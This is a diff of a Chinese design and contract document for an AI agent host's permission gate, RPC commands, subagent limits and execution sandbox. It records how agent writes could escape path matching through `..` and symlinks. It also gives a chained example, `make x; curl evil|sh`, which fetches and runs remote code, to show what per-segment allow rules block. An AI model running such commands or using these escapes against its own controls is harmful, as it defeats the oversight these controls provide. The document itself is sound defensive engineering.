@@ -51,9 +51,9 @@ stdin EOF、SIGTERM、SIGINT → settle 全部挂起对话框（默认值）→ 
 ```
 
 - 每次工具调用热读（设置 UI 改文件即时生效）；缺文件/坏 JSON → `{mode:"ask"}`。
-- 匹配对象：`bash`→命令串；`write`/`edit`→工具入参的**原始 `path`**（未解析相对/绝对）。
-- glob 语义：`*` 跨任意字符（含 `/`），其余按字面；regex 元字符转义。
-- 判定顺序（单一真相 `decide()`）：`mode=allow-all`→allow；`mode=block-all`→block；命中 blockPatterns→block；命中 allowPatterns→allow；否则 ask。**用户裁决**：本次覆盖 bash + write + edit。
+- 匹配对象：`bash`→命令串；`write`/`edit`→工具入参 `path` 解析后的**绝对路径**（先词法 resolve 到会话 cwd，再 realpath 收缩最深已存在祖先目录）——匹配「实际写入效果」而非模型原始字符串（红测结论：原始前缀匹配可被 `..` 与符号链接目录逃逸）。残余边界：末端悬空符号链接按词法保留（写入会跟随目标）。
+- glob 语义：`*` 跨任意字符（含 `/`），其余按字面；实现为分段顺序匹配（线性、无回溯，多星模式不可造成灾难性回溯）。
+- 判定顺序（单一真相 `decide()`）：`mode=allow-all`→allow；`mode=block-all`→block；命中 blockPatterns→block；命中 allowPatterns→allow，**bash 例外：组合命令逐段校验**（`;` `&&` `&` `||` `|` 换行分段，每段去空白后须各自命中某条 allow 模式；反引号/`$(`/`<`/`>` 永不组合——出现即降级 ask；`"make *"` 不放行 `make x; curl evil|sh`，`"echo *"`+`"sleep *"` 放行 `echo a && sleep 1 && echo b`）；其余 ask。**用户裁决**：本次覆盖 bash + write + edit。
 - ask 时经 `ctx.ui.confirm` 弹窗（5 分钟超时默认拒绝）；`ctx.hasUI=false` 时 ask 直接 block。
 
 ## 契约 v0.2 增补：auth 命令组（2026-09-07，用户裁决：v1 仅 API key，OAuth 延后）
@@ -83,20 +83,20 @@ threadId 恒等于当前 session 的 sessionId。**fork/clone 后 session 被替
 
 ### 新命令
 
-| type                | 字段                                                                                       | 语义                                                                                                            |
-| ------------------- | ------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------- |
-| `get_entries`       | `threadId`, `since?`                                                                       | 会话全量/增量条目（追加树，entry id 即持久游标）；`since` 不存在 → failure                                      |
-| `get_tree`          | `threadId`                                                                                 | 会话树 + `leafId`                                                                                               |
-| `set_session_name`  | `threadId`, `name`（trim 后非空）                                                          | 显示名                                                                                                          |
-| `get_session_stats` | `threadId`                                                                                 | token/成本/上下文用量                                                                                           |
-| `clear_queue`       | `threadId`                                                                                 | 清空排队 steer/followUp → `{steering, followUp}`                                                                |
-| `fork`              | `threadId`, `entryId`, `position?`（`before`\|`at`，默认 before）                          | 从历史条目分叉 → 新 threadId                                                                                    |
-| `clone`             | `threadId`                                                                                 | 在当前 leaf 处复制分叉（= fork at leaf；无 leaf → failure）                                                     |
-| `navigate_tree`     | `threadId`, `targetId`, `summarize?`/`customInstructions?`/`replaceInstructions?`/`label?` | 会话内跳转                                                                                                      |
-| `get_fork_messages` | `threadId`                                                                                 | 可分叉的用户消息列表                                                                                            |
-| `get_commands`      | `threadId`                                                                                 | 斜杠命令/skills 枚举（extension/prompt/skill 三源）                                                             |
-| `bash`              | `threadId`, `command`, `excludeFromContext?`                                               | 直执行 shell：结果在 response；流式输出经既有 `event` 帧（`bash_execution_update`，带 command 的 `id`）自动下发 |
-| `abort_bash`        | `threadId`                                                                                 | 中止运行中的 bash                                                                                               |
+| type                | 字段                                                                                                                                 | 语义                                                                                                            |
+| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------- |
+| `get_entries`       | `threadId`, `since?`, `before?`, `limit?`（≤5000，取窗口内最近 N 条，响应带 `hasMore?`；`since` 前向/`before` 后向游标，防无界单帧） | 会话条目窗口（追加树，entry id 即持久游标）；`since`/`before` 不存在 → failure                                  |
+| `get_tree`          | `threadId`                                                                                                                           | 会话树 + `leafId`                                                                                               |
+| `set_session_name`  | `threadId`, `name`（trim 后非空）                                                                                                    | 显示名                                                                                                          |
+| `get_session_stats` | `threadId`                                                                                                                           | token/成本/上下文用量                                                                                           |
+| `clear_queue`       | `threadId`                                                                                                                           | 清空排队 steer/followUp → `{steering, followUp}`                                                                |
+| `fork`              | `threadId`, `entryId`, `position?`（`before`\|`at`，默认 before）                                                                    | 从历史条目分叉 → 新 threadId                                                                                    |
+| `clone`             | `threadId`                                                                                                                           | 在当前 leaf 处复制分叉（= fork at leaf；无 leaf → failure）                                                     |
+| `navigate_tree`     | `threadId`, `targetId`, `summarize?`/`customInstructions?`/`replaceInstructions?`/`label?`                                           | 会话内跳转                                                                                                      |
+| `get_fork_messages` | `threadId`                                                                                                                           | 可分叉的用户消息列表                                                                                            |
+| `get_commands`      | `threadId`                                                                                                                           | 斜杠命令/skills 枚举（extension/prompt/skill 三源）                                                             |
+| `bash`              | `threadId`, `command`, `excludeFromContext?`                                                                                         | 直执行 shell：结果在 response；流式输出经既有 `event` 帧（`bash_execution_update`，带 command 的 `id`）自动下发 |
+| `abort_bash`        | `threadId`                                                                                                                           | 中止运行中的 bash                                                                                               |
 
 ### 其他修订
 
@@ -238,3 +238,23 @@ src/
 - **U2 停止语义**：`abort`/`thread/stop`/shutdown → killAll（前台+后台+通知队列+抑制集）。
 - **可观察面**：`subagent_event`/`subagent_message` 帧、心跳 `subagents` 计数、user-role 通知注入（自动 token 成本）。
 - **孙权限热读**：thread/start 内部字段 `permissionThreadId` —— 孙的权限门每次调用重读父对话规则（sidecar→全局），收紧即时传导，无 spawn 快照冻结。
+
+## 契约 v0.6 增补：可观测性与护栏（2026-09-09，已实施；来源 docs/plans/2026-09-09-production-hardening.md）
+
+对外纯增量（37 命令 / 8 帧，帧不变）：
+
+- **`get_host_info`**（host 本地，无字段）→ `{version, piVersion, bunVersion, pid, uptimeMs, rssBytes, threads:{live,parked,dead}, subagents:{running}, limits:{maxThreads, idleRetireMs, workerStaleMs, workerExitTimeoutMs, maxSubagents, bashTimeoutMs}}`。版本启动期一次性读取；不回显路径/env/凭据。`subagents.running` = grant 账本的全局运行孙进程数（与心跳 `subagents`（在飞=queued+running）是两个口径，各自单一真相）。
+- **`bash` 新增可选 `timeoutMs`**：正整数 ≤ 86_400_000；`0` 显式关闭；缺省 `PAI_BASH_TIMEOUT_MS`（默认 600_000，`0` 关闭）。到点服务端 `abortBash` → `success:true` + `BashResult.cancelled:true`（与 abort_bash 同形，恰好一响应不变）。非法值 failure。`user_bash` 扩展替换执行路径不套计时（与 pi RPC 一致）。
+- **环境旋钮**：`PAI_MAX_SUBAGGENTS`（默认 16）——全局**正在运行**孙进程硬上限，经 host↔worker 内部 grant 仲裁强制执行（规格见 migration/design.md §3 增补）：worker 在任务 queued→running 前（spawn 前）向 host 申请租约，拒绝=任务立即失败（`global subagent limit reached`，模型可见可重试），不排队；settle/kill 释放；租约 TTL 5 分钟 + 心跳续约（worker 心跳 `subagents>0` 时刷新其全部租约）+ worker 死亡回收。线程内既有预算（≤8/调用、并发 ≤4、在飞 ≤8）不变，两道闸门串联。
+- 验收口径：e2e-mock `subagent-global-quota` 场景（PAI_MAX_SUBAGGENTS=1 下并行 2 任务恰 1 运行 1 拒绝、settle 后租约归零）+ smoke 断言（get_host_info 形状、timeoutMs 校验矩阵、超时 cancelled 往返）+ worker-pool 单测（租约申请/释放/TTL/心跳续约/死亡回收）。
+
+## 契约 v0.7 增补：agent 执行沙箱（2026-09-09，已实施；方案 docs/plans/2026-09-09-sandbox.md）
+
+纯增量（38 命令 / 8 帧）：权限门之上的第二道防线，内联扩展形态对全部线程（含孙进程，untrusted 只读全局配置）生效。
+
+- **配置**：`<agentDir>/sandbox.json` + 项目 `.pi/sandbox.json`（仅 trusted 合并）；坏文件降级默认；**会话创建快照**（fork/rebind 重取）；默认 enabled:true；`PAI_SANDBOX=off` 机器级关。
+- **bash**：OS 级包裹（@anthropic-ai/sandbox-runtime 0.0.75；macOS sandbox-exec / Linux bwrap）——agent 工具经同名替换、直执行经 user_bash operations；降级 fail-open + `degraded` 可见 + stderr 一次警告。
+- **write/edit/read**：进程内硬检查（不依赖 runtime，降级仍生效）；路径 = pi 工具语义归一 + gate-path realpath 效应空间（两侧对称）；比较 NFC + 平台大小写折叠；两份 sandbox.json 恒 denyWrite。
+- **`get_sandbox_state`**（thread-scoped）：快照 + 降级态 + bashSandboxed 的单一真相。
+- 判定顺序不变量：权限门先（原始输入）、沙箱后（强制）；恰好一响应等全部既有契约不受影响。
+- 实测口径（darwin arm64 / bun 1.4.2）：cwd 内写通过、cwd 外/.env/~/.ssh/非白名单域名被 OS 层拒（Operation not permitted / 连接被断）、白名单 127.0.0.1 可达；对拍脚本见方案 §六批 0。
